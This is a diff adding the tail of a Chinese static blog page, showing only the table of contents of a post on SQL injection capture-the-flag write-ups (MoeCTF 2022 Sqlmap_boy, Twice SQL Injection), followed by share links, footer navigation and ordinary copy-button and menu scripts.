+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MoeCTF-2022-Sqlmap-boy"><span class="toc-number">1.1.</span> <span class="toc-text">[MoeCTF 2022]Sqlmap_boy</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%A1%AE%E5%AE%9A%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.确定闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.确定字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.确定回显位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E7%88%86%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.6.</span> <span class="toc-text">6.爆字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5flAg%E7%9A%84%E5%80%BC"><span class="toc-number">1.1.7.</span> <span class="toc-text">7.获取字段flAg的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#October-2019-Twice-SQL-Injection"><span class="toc-number">1.3.</span> <span class="toc-text">[October 2019]Twice SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%BE%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">1.找闭合方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%8E%B7%E5%8F%96%E5%AD%97%E6%AE%B5flag%E7%9A%84%E5%80%BC"><span class="toc-number">1.3.4.</span> <span class="toc-text">4.获取字段flag的值</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&text=SQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入&body=Check out this article: https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&title=SQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&name=SQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://dgxddd.github.io/2022/04/10/SQL%E6%B3%A8%E5%85%A5/&t=SQL注入"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    jxdgx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+<link rel="stylesheet" href="/css/custom.css">
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<script src="/js/custom.js"></script>
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
